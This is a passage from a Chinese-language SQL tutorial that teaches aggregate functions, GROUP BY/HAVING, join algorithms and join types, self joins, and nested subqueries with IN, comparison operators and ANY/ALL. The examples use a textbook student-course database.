<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span> <span class="string">&#x27;2&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328171230259.png" alt="在这里插入图片描述"></p>
<p><strong>[例30]查询学生201215121选修课程的总学分数。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(Ccredit)</span><br><span class="line"><span class="keyword">FROM</span>  SC, Course</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;201215121&#x27;</span> <span class="keyword">AND</span> SC.Cno<span class="operator">=</span>Course.Cno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328171516930.png" alt="在这里插入图片描述"></p>
<h2 id="GROUP-BY子句"><a href="#GROUP-BY子句" class="headerlink" title="GROUP BY子句"></a>GROUP BY子句</h2><p><strong><code>GROUP BY</code>子句分组：</strong><br><strong>细化聚集函数的作用对象</strong></p>
<ul>
<li>未对查询结果分组，聚集函数将作用于整个查询结果</li>
<li>对查询结果分组后，聚集函数将分别作用于每个组</li>
<li>作用对象是查询的中间结果表</li>
<li>按指定的一列或多列值分组，值相等的为一组</li>
</ul>
<p><strong><code>HAVING</code>短语与<code>WHERE</code>子句的区别：</strong></p>
<ul>
<li>作用对象不同</li>
<li>WHERE子句作用于<code>基表或视图</code>，从中选择满足条件的<code>元组</code></li>
<li>HAVING短语作用于<code>组</code>，从中选择满足条件的<code>组</code>。</li>
</ul>
<p><strong>[例31] 求各个课程号及相应的选课人数。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">COUNT</span>(Sno)</span><br><span class="line"><span class="keyword">FROM</span>    SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020032817221647.png" alt="在这里插入图片描述"></p>
<p><strong>[例32] 查询选修了2门以上课程的学生学号。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span>  SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno</span><br><span class="line"><span class="keyword">HAVING</span>  <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;</span><span class="number">2</span>;  </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328172509185.png" alt="在这里插入图片描述"></p>
<h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><p><strong>连接查询：同时涉及多个表的查询</strong></p>
<p><strong>连接条件或连接谓词：用来连接两个表的条件</strong></p>
<p><strong>一般格式：</strong></p>
<ul>
<li><code>[&lt;表名1&gt;.]&lt;列名1&gt; &lt;比较运算符&gt; [&lt;表名2&gt;.]&lt;列名2&gt;</code></li>
<li><code>[&lt;表名1&gt;.]&lt;列名1&gt; BETWEEN [&lt;表名2&gt;.]&lt;列名2&gt; AND [&lt;表名2&gt;.]&lt;列名3&gt;</code></li>
</ul>
<p><strong>连接字段：连接谓词中的列名称</strong></p>
<ul>
<li>连接条件中的各连接字段类型必须是可比的，但名字不必是相同的</li>
</ul>
<h2 id="连接操作的执行过程"><a href="#连接操作的执行过程" class="headerlink" title="连接操作的执行过程"></a>连接操作的执行过程</h2><h3 id="嵌套循环法-NESTED-LOOP"><a href="#嵌套循环法-NESTED-LOOP" class="headerlink" title="嵌套循环法(NESTED-LOOP)"></a>嵌套循环法(NESTED-LOOP)</h3><ul>
<li>首先在表1中找到第一个元组，然后从头开始扫描表2，逐一查找满足连接件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。</li>
<li>表2全部查找完后，再找表1中第二个元组，然后再从头开始扫描表2，逐一查找满足连接条件的元组，找到后就将表1中的第二个元组与该元组拼接起来，形成结果表中一个元组。</li>
<li>重复上述操作，直到表1中的全部元组都处理完毕</li>
</ul>
<h3 id="排序合并法-SORT-MERGE"><a href="#排序合并法-SORT-MERGE" class="headerlink" title="排序合并法(SORT-MERGE)"></a>排序合并法(SORT-MERGE)</h3><p><strong>常用于=连接</strong></p>
<ul>
<li>首先按连接属性对表1和表2排序</li>
<li>对表1的第一个元组，从头开始扫描表2，顺序查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。当遇到表2中第一条大于表1连接字段值的元组时，对表2的查询不再继续</li>
<li>找到表1的第二条元组，然后从刚才的中断点处继续顺序扫描表2，查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。直接遇到表2中大于表1连接字段值的元组时，对表2的查询不再继续</li>
<li>重复上述操作，直到表1或表2中的全部元组都处理完毕为止</li>
</ul>
<h3 id="索引连接-INDEX-JOIN"><a href="#索引连接-INDEX-JOIN" class="headerlink" title="索引连接(INDEX-JOIN)"></a>索引连接(INDEX-JOIN)</h3><ul>
<li>对表2按连接字段建立索引</li>
<li>对表1中的每个元组，依次根据其连接字段值查询表2的索引，从中找到满足条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组</li>
</ul>
<h2 id="等值与非等值连接查询"><a href="#等值与非等值连接查询" class="headerlink" title="等值与非等值连接查询"></a>等值与非等值连接查询</h2><p><strong>等值连接：连接运算符为=</strong></p>
<p><strong>[例33] 查询每个学生及其选修课程的情况</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Student.<span class="operator">*</span>,SC.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span>     Student,SC</span><br><span class="line"><span class="keyword">WHERE</span>  Student.Sno <span class="operator">=</span> SC.Sno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328174005236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>自然连接</strong></p>
<p><strong>[例34] 对[例33]用自然连接完成。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade</span><br><span class="line"><span class="keyword">FROM</span>     Student,SC</span><br><span class="line"><span class="keyword">WHERE</span>  Student.Sno <span class="operator">=</span> SC.Sno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328174148296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="自身连接"><a href="#自身连接" class="headerlink" title="自身连接"></a>自身连接</h2><ul>
<li><strong>自身连接：一个表与其自己进行连接</strong></li>
<li><strong>需要给表起别名以示区别</strong></li>
<li><strong>由于所有属性名都是同名属性，因此必须使用别名前缀</strong></li>
</ul>
<p><strong>[例35]查询每一门课的间接先修课（即<code>先修课的先修课</code>）</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  FIRST.Cno,SECOND.Cpno</span><br><span class="line"><span class="keyword">FROM</span>  Course  <span class="keyword">FIRST</span>,Course  <span class="keyword">SECOND</span></span><br><span class="line"><span class="keyword">WHERE</span> FIRST.Cpno <span class="operator">=</span> SECOND.Cno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328174958693.png" alt="在这里插入图片描述"></p>
<h2 id="连接JOIN"><a href="#连接JOIN" class="headerlink" title="连接JOIN"></a>连接JOIN</h2><p><strong>SQL join 用于把来自两个或多个表的行结合起来。</strong><br><strong>标准格式：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1<span class="operator">/</span><span class="operator">/</span>左表</span><br><span class="line"><span class="operator">&lt;</span>xxx <span class="keyword">JOIN</span><span class="operator">&gt;</span> table2<span class="operator">/</span><span class="operator">/</span>右表</span><br><span class="line"><span class="keyword">ON</span> table1.column_name<span class="operator">=</span>table2.column_name;</span><br></pre></td></tr></table></figure>
<p><strong>分类：</strong></p>
<ul>
<li><code>INNER JOIN (JOIN)</code></li>
<li><code>LEFT JOIN (LEFT OUTER JOIN)</code></li>
<li><code>RIGHT JOIN (RIGHT OUTER JOIN)</code></li>
<li><code>FULL JOIN (FULL OUTER JOIN)</code></li>
</ul>
<p>这里就以SC和Course两个表来检验这四类连接</p>
<p><img src="https://img-blog.csdnimg.cn/20200328184438818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="INNER-JOIN-JOIN"><a href="#INNER-JOIN-JOIN" class="headerlink" title="INNER JOIN (JOIN)"></a>INNER JOIN (JOIN)</h3><ul>
<li><code>INNER JOIN</code>：关键字在表中存在至少一个匹配时返回行。<br><img src="https://img-blog.csdnimg.cn/20200328181150122.png" alt="在这里插入图片描述"></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,SC.Cno,Grade,Course.Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span>  SC <span class="keyword">INNER</span> <span class="keyword">JOIN</span> Course <span class="keyword">ON</span> (SC.Cno<span class="operator">=</span>Course.Cno);</span><br><span class="line"><span class="comment">/*INNER JOIN 与 JOIN结果相同*/</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,SC.Cno,Grade,Course.Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span>  SC  <span class="keyword">JOIN</span> Course <span class="keyword">ON</span> (SC.Cno<span class="operator">=</span>Course.Cno);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328184047680.png" alt="在这里插入图片描述"></p>
<h3 id="LEFT-JOIN-LEFT-OUTER-JOIN"><a href="#LEFT-JOIN-LEFT-OUTER-JOIN" class="headerlink" title="LEFT JOIN (LEFT OUTER JOIN)"></a>LEFT JOIN (LEFT OUTER JOIN)</h3><ul>
<li><code>LEFT JOIN</code>：关键字从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200328181212136.png" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,SC.Cno,Grade,Course.Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span>  SC <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> Course <span class="keyword">ON</span> (SC.Cno<span class="operator">=</span>Course.Cno);</span><br><span class="line"><span class="comment">/*LEFT JOIN 与 LEFT OUTER JOIN结果相同*/</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,SC.Cno,Grade,Course.Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span>  SC <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Course <span class="keyword">ON</span> (SC.Cno<span class="operator">=</span>Course.Cno);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328185007546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="RIGHT-JOIN-RIGHT-OUTER-JOIN"><a href="#RIGHT-JOIN-RIGHT-OUTER-JOIN" class="headerlink" title="RIGHT JOIN (RIGHT OUTER JOIN)"></a>RIGHT JOIN (RIGHT OUTER JOIN)</h3><ul>
<li><code>RIGHT JOIN</code>：关键字从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。<br><img src="https://img-blog.csdnimg.cn/20200328181227458.png" alt="在这里插入图片描述"></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,SC.Cno,Grade,Course.Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span>  SC <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> Course <span class="keyword">ON</span> (SC.Cno<span class="operator">=</span>Course.Cno);</span><br><span class="line"><span class="comment">/*RIGHT JOIN 与 RIGHT OUTER JOIN结果相同*/</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,SC.Cno,Grade,Course.Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span>  SC <span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Course <span class="keyword">ON</span> (SC.Cno<span class="operator">=</span>Course.Cno);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328185227724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="FULL-JOIN-FULL-OUTER-JOIN"><a href="#FULL-JOIN-FULL-OUTER-JOIN" class="headerlink" title="FULL JOIN (FULL OUTER JOIN)"></a>FULL JOIN (FULL OUTER JOIN)</h3><ul>
<li><code>FULL JOIN</code>：关键字只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行。结合了 LEFT JOIN 和 RIGHT JOIN 的结果。<br><img src="https://img-blog.csdnimg.cn/20200328181237180.png" alt="在这里插入图片描述"></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,SC.Cno,Grade,Course.Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span>  SC <span class="keyword">FULL</span> <span class="keyword">JOIN</span> Course <span class="keyword">ON</span> (SC.Cno<span class="operator">=</span>Course.Cno);</span><br><span class="line"><span class="comment">/*FULL JOIN 与 FULL OUTER JOIN结果相同*/</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,SC.Cno,Grade,Course.Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span>  SC <span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> Course <span class="keyword">ON</span> (SC.Cno<span class="operator">=</span>Course.Cno);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328185614975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="复合条件连接"><a href="#复合条件连接" class="headerlink" title="复合条件连接"></a>复合条件连接</h2><p><strong>复合条件连接：WHERE子句中含多个连接条件</strong></p>
<p><strong>[例37]查询选修2号课程且成绩在88分以上的所有学生</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.Sno, Sname</span><br><span class="line"><span class="keyword">FROM</span>    Student,SC</span><br><span class="line"><span class="keyword">WHERE</span> Student.Sno <span class="operator">=</span> SC.Sno <span class="keyword">AND</span>   </span><br><span class="line"><span class="comment">/* 连接谓词*/</span></span><br><span class="line">SC.Cno<span class="operator">=</span> <span class="string">&#x27;2&#x27;</span> <span class="keyword">AND</span> SC.Grade <span class="operator">&gt;</span> <span class="number">88</span>;     </span><br><span class="line"><span class="comment">/* 其他限定条件 */</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328190502486.png" alt="在这里插入图片描述"><br><strong>[例38]查询每个学生的学号、姓名、选修的课程名及成绩</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname,Cname,Grade</span><br><span class="line"><span class="keyword">FROM</span>    Student,SC,Course  <span class="comment">/*多表连接*/</span></span><br><span class="line"><span class="keyword">WHERE</span> Student.Sno <span class="operator">=</span> SC.Sno </span><br><span class="line"><span class="keyword">and</span> SC.Cno <span class="operator">=</span> Course.Cno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328190635619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxNDYwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h1><h2 id="嵌套查询概述"><a href="#嵌套查询概述" class="headerlink" title="嵌套查询概述"></a>嵌套查询概述</h2><ul>
<li>一个SELECT-FROM-WHERE语句称为一个<code>查询块</code></li>
<li>将一个<code>查询块嵌套</code>在另一个<code>查询块</code>的<code>WHERE</code>子句或<code>HAVING</code>短语的条件中的查询称为<code>嵌套查询</code></li>
</ul>
<p><strong>一个例子：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">SELECT</span> Sname<span class="comment">/*外层查询/父查询*/</span></span><br><span class="line"> <span class="keyword">FROM</span> Student</span><br><span class="line"> <span class="keyword">WHERE</span> Sno <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sno    <span class="comment">/*内层查询/子查询*/</span></span><br><span class="line"> <span class="keyword">FROM</span> SC</span><br><span class="line"> <span class="keyword">WHERE</span> Cno<span class="operator">=</span> <span class="string">&#x27;2&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328191426836.png" alt="在这里插入图片描述"></p>
<ul>
<li>子查询的<code>限制</code>： <code>·不能使用ORDER BY子句·</code></li>
<li>层层嵌套方式反映了 SQL语言的结构化</li>
<li>有些嵌套查询可以用连接运算替代</li>
</ul>
<h2 id="不相关子查询"><a href="#不相关子查询" class="headerlink" title="不相关子查询"></a>不相关子查询</h2><p><strong><code>子查询的查询条件不依赖于父查询</code></strong></p>
<ul>
<li>由里向外 逐层处理。即每个子查询在上一级查询处理之前求解，子查询的结果用于建立其父查询的查找条件。</li>
</ul>
<h2 id="相关子查询"><a href="#相关子查询" class="headerlink" title="相关子查询"></a>相关子查询</h2><p><strong><code>子查询的查询条件依赖于父查询</code></strong></p>
<ul>
<li>首先取外层查询中表的第一个元组，根据它与内层查询相关的属性值处理内层查询，若WHERE子句返回值为真，则取此元组放入结果表</li>
<li>然后再取外层表的下一个元组</li>
<li>重复这一过程，直至外层表全部检查完为止</li>
</ul>
<h2 id="带有IN谓词的子查询"><a href="#带有IN谓词的子查询" class="headerlink" title="带有IN谓词的子查询"></a>带有IN谓词的子查询</h2><p><strong>[例39] 查询与“刘晨”在同一个系学习的学生。此查询要求可以分步来完成</strong></p>
<ul>
<li>① 确定“刘晨”所在系名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Sdept  </span><br><span class="line"><span class="keyword">FROM</span>     Student                            </span><br><span class="line"><span class="keyword">WHERE</span>  Sname<span class="operator">=</span> <span class="string">&#x27;刘晨&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328192246580.png" alt="在这里插入图片描述"></p>
<ul>
<li>② 查找所有在CS系学习的学生。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Sno,Sname,Sdept     </span><br><span class="line"><span class="keyword">FROM</span>    Student                 </span><br><span class="line"><span class="keyword">WHERE</span>  Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328192207929.png" alt="在这里插入图片描述"><br><strong>将第一步查询嵌入到第二步查询的条件中</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept  <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname<span class="operator">=</span> <span class="string">&#x27;刘晨&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328192431892.png" alt="在这里插入图片描述"></p>
<ul>
<li>此查询为不相关子查询。</li>
</ul>
<p><strong>[例40]查询选修了课程名为“信息系统”的学生学号和姓名</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sname <span class="comment">/*③ 最后在Student关系中取出Sno和Sname*/</span></span><br><span class="line"><span class="keyword">FROM</span>    Student  </span><br><span class="line"><span class="keyword">WHERE</span> Sno  <span class="keyword">IN</span></span><br><span class="line">(  <span class="keyword">SELECT</span> Sno  	<span class="comment">/*② 然后在SC关系中找出选修了3号课程的学生学号*/</span></span><br><span class="line">	 <span class="keyword">FROM</span>    SC      </span><br><span class="line">	 <span class="keyword">WHERE</span>  Cno <span class="keyword">IN</span></span><br><span class="line">		( <span class="keyword">SELECT</span> Cno   <span class="comment">/*① 首先在Course关系中找出 “信息系统”的课程号,为3号*/</span></span><br><span class="line">		  <span class="keyword">FROM</span> Course    </span><br><span class="line">		  <span class="keyword">WHERE</span> Cname<span class="operator">=</span> <span class="string">&#x27;信息系统&#x27;</span></span><br><span class="line">     )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328194014135.png" alt="在这里插入图片描述"></p>
<p><strong>用连接查询实现[例40]</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname</span><br><span class="line"><span class="keyword">FROM</span>    Student,SC,Course</span><br><span class="line"><span class="keyword">WHERE</span> Student.Sno <span class="operator">=</span> SC.Sno </span><br><span class="line"><span class="keyword">AND</span> SC.Cno <span class="operator">=</span> Course.Cno </span><br><span class="line"><span class="keyword">AND</span> Course.Cname<span class="operator">=</span><span class="string">&#x27;信息系统&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328194217851.png" alt="在这里插入图片描述"></p>
<h2 id="带有比较运算符的子查询"><a href="#带有比较运算符的子查询" class="headerlink" title="带有比较运算符的子查询"></a>带有比较运算符的子查询</h2><ul>
<li>带有比较运算符的子查询是指父查询与子查询之间用比较运算符进行连接。当用户能确切知道内层查询返回的是<code>单个值</code>时，可以用&gt;、&lt;、=、&gt;=、&lt;= 、!=或&lt; &gt;等<code>比较运算符</code>。</li>
<li>与ANY或ALL谓词配合使用</li>
</ul>
<p><strong>例：假设一个学生只可能在一个系学习，并且必须属于一个系，则在[例39]可以用<code>= 代替IN</code>：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept  <span class="operator">=</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname<span class="operator">=</span> <span class="string">&#x27;刘晨&#x27;</span>);</span><br><span class="line"><span class="comment">/*两种方式都可以*/</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname<span class="operator">=</span> <span class="string">&#x27;刘晨&#x27;</span>)</span><br><span class="line"><span class="operator">=</span> Sdept ;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328210722539.png" alt="在这里插入图片描述"><br><strong>［例41］找出每个学生超过他选修课程平均成绩的课程号。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno, Cno</span><br><span class="line"><span class="keyword">FROM</span>  SC  x</span><br><span class="line"><span class="keyword">WHERE</span> Grade <span class="operator">&gt;=</span>(<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(Grade)  <span class="comment">/*相关子查询*/</span> </span><br><span class="line">   	           <span class="keyword">FROM</span>  SC y</span><br><span class="line">              <span class="keyword">WHERE</span> y.Sno<span class="operator">=</span>x.Sno</span><br><span class="line">   						 );</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020032821122791.png" alt="在这里插入图片描述"></p>
<p><strong><code>［例41］可能的执行过程：</code></strong><br>1.从外层查询中取出SC的一个元组x，将元组x的Sno值（201215121）传送给内层查询。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC y</span><br><span class="line"><span class="keyword">WHERE</span> y.Sno<span class="operator">=</span><span class="string">&#x27;201215121&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328211628491.png" alt="在这里插入图片描述"></p>
<p>2.执行内层查询，得到值88（近似值），用该值代替内层查询，得到外层查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno, Cno</span><br><span class="line"><span class="keyword">FROM</span>  SC x</span><br><span class="line"><span class="keyword">WHERE</span> Grade <span class="operator">&gt;=</span><span class="number">88</span>; </span><br></pre></td></tr></table></figure>
<p>3.执行这个查询，得到<br>（200215121，1）<br>（200215121，3）</p>
<p>4.外层查询取出下一个元组<code>重复做上述1至3步骤</code>，直到外层的SC元组全部处理完毕。结果为:<br><img src="https://img-blog.csdnimg.cn/2020032821122791.png" alt="在这里插入图片描述"></p>
<h2 id="带有ANY（SOME）或ALL谓词的子查询"><a href="#带有ANY（SOME）或ALL谓词的子查询" class="headerlink" title="带有ANY（SOME）或ALL谓词的子查询"></a>带有ANY（SOME）或ALL谓词的子查询</h2><p><strong>谓词语义：</strong></p>
<ul>
<li><code>ANY：任意一个值</code></li>
<li><code>ALL：所有值</code></li>
</ul>
<p><strong>需要配合使用比较运算符:</strong></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>&gt; ANY</td>
<td>大于子查询结果中的某个值</td>
</tr>
<tr>
<td>&gt; ALL</td>
<td>大于子查询结果中的所有值</td>
</tr>
<tr>
<td>&lt; ANY</td>
<td>小于子查询结果中的某个值</td>
</tr>
<tr>
<td>&lt; ALL</td>
<td>小于子查询结果中的所有值</td>
</tr>
<tr>
<td>&gt;= ANY</td>
<td>大于等于子查询结果中的某个值</td>
</tr>
<tr>
<td>&gt;= ALL</td>
<td>大于等于子查询结果中的所有值</td>
</tr>
<tr>
<td>&lt;= ANY</td>
<td>小于等于子查询结果中的某个值</td>
</tr>
<tr>
<td>&lt;= ALL</td>
<td>小于等于子查询结果中的所有值</td>
</tr>
<tr>
<td>= ANY</td>
<td>等于子查询结果中的某个值</td>
</tr>
<tr>
<td>=ALL</td>
<td>等于子查询结果中的所有值（通常没有实际意义）</td>
</tr>
<tr>
<td>!=（或&lt;&gt;）ANY</td>
<td>不等于子查询结果中的某个值</td>
</tr>
<tr>
<td>!=（或&lt;&gt;）ALL</td>
<td>不等于子查询结果中的任何一个值</td>
</tr>
</tbody></table>
<p><strong>[例42] 查询其他系中比计算机科学某一学生年龄小的学生姓名和年龄</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span>    Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;</span> <span class="keyword">ANY</span> (<span class="keyword">SELECT</span>  Sage</span><br><span class="line">                 <span class="keyword">FROM</span>    Student</span><br><span class="line">                  <span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>)</span><br><span class="line">   			 <span class="keyword">AND</span> Sdept <span class="operator">&lt;&gt;</span> <span class="string">&#x27;CS&#x27;</span> ; <span class="comment">/*父查询块中的条件 */</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328213109641.png" alt="在这里插入图片描述"><br><strong>执行过程：</strong></p>
<blockquote>
<p>关系数据库管理系统（Relational Database Management System：RDBMS）</p>
</blockquote>
